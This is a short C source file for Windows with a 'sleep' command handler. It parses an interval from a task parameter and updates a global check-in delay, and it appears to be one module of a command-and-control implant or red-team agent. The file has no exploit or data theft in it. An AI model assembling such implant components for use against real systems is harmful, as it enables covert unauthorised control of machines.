#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#ifdef INCLUDE_CMD_SLEEP

extern int current_sleep_time;

void command_sleep(char *task_id, char *params) {
  if (!params || strlen(params) == 0) {
    char msg[100];
    snprintf(msg, sizeof(msg), "Current sleep time: %d seconds",
             current_sleep_time / 1000);
    send_task_response(task_id, msg);
    return;
  }

  int new_sleep = 0;

  // Parse JSON manually to extract the number
  if (params[0] == '{') {
    // Look for "interval": followed by a number
    char *interval_pos = strstr(params, "\"interval\"");
    if (interval_pos) {
      // Skip to the colon
      char *colon = strchr(interval_pos, ':');
      if (colon) {
        // Skip whitespace after colon
        colon++;
        while (*colon == ' ' || *colon == '\t')
          colon++;
        new_sleep = atoi(colon);
      }
    }
  } else {
    new_sleep = atoi(params);
  }

  if (new_sleep < 0) {
    send_task_response(task_id, "Error: Sleep time must be positive");
    return;
  }

  current_sleep_time = new_sleep * 1000; // Convert to milliseconds
  char msg[100];
  snprintf(msg, sizeof(msg), "Sleep time updated to %d seconds", new_sleep);
  send_task_response(task_id, msg);
}

#endif
